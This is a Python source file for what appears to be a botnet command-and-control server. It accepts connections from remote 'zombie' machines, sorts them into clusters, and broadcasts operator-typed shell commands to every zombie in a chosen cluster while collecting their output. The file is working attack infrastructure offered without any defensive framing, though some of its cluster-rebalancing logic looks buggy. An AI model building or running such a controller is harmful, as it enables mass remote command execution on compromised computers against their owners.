# import modules
import socket
import os
from _thread import *
from statistics import mean


# define constants
SERVER_IP = "192.168.3.144"
SERVER_PORT = 5678;
thread_count = 0;
clusters = [[]]
clusters_length = [0]



def accept_connections():
    
    global thread_count
    
    while True:
        # accept connection & Message : Connected
        connection,address = s.accept();

        print(f"Connect Established with {connection.getpeername()}");

        add_zombie(connection, address)

        thread_count += 1


def add_zombie(connection, address):

    for i in range(len(clusters)):
        clusters_length.pop(i)
        clusters_length.insert(i, len(clusters[i]))

    clusters[clusters_length.index(min(clusters_length))].append([address, connection])

    for i in range(len(clusters)):
        clusters_length.pop(i)
        clusters_length.insert(i, len(clusters[i]))
        

def execute_command(command, cluster_id):
    cluster = clusters[cluster_id]
    print(command)
    
    for zombie in cluster:
        connection = zombie[1]


        # send command

        connection.send(command.encode('utf-8'));



        # recieve output and show user

        output = connection.recv(1024).decode('utf-8');

        print(output);



def change_cluster_size(size):
    for i in range(size - len(clusters)):
        clusters_length.append(0)

    for i in range(size - len(clusters)):
        clusters.append([])

    avg_cluster_size = mean(clusters_length)

    for i in range(len(clusters)):
        if (len(clusters[i]) > avg_cluster_size):
            for j in range(1, int(len(clusters[i]) - avg_cluster_size) ):
                print("HERE",i,j)
                clusters[i + j].append(clusters[i].pop())
        
    for i in range(len(clusters)):
        clusters_length.pop(i)
        clusters_length.insert(i, len(clusters[i]))



# create and maintain socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    
    # bind and host server
    s.bind((SERVER_IP,SERVER_PORT));
    s.listen(1);
    
    
    # Message : Awaiting Connection
    print(f"Awaiting Connection at {SERVER_IP}:{SERVER_PORT}");

    start_new_thread(accept_connections, ())

    while True:


        # input command

        command = input("\ncatcher# ")   

        if (command[:5] == 'zlist'):
            print('CLUSTER      |      IP ADDRESS       |      CONNECTION')

            for i in range(len(clusters)):
                for zombie in clusters[i]:
                    print(f'CL-{i}|{zombie[0]}|{zombie[1]}')
                
            print(f'\nNo of zombies = {thread_count}')
            print(f'\nNo of clusters = {len(clusters)}')

        elif (command[:7] == 'execute'):
            if (thread_count == 0):
                print("!!!NOT CONNECTED TO ANY ZOMBIES!!!")

            else:
              
                cluster_id = int(command[8:9])
                command = command[10:len(command)]
                print("CLUSTER ID",cluster_id)
                # exit command
                execute_command(command, cluster_id)

        elif (command[:7] == "exit -t"):

                break;
                


        elif (command[:12] == 'cluster-size'):
              cluster_size = command[13:len(command)]
              change_cluster_size(int(cluster_size))

        else:
            print('****LIST OF COMMANDS****')
            print('''
            \n\tzlist - List no of zombies
            \n\texecute [cluster-id] [command] - Execute command
            \n\tcluster-size [size] - Change the number of clusters. Default is 1.
            ''')


    s.close()
    
    
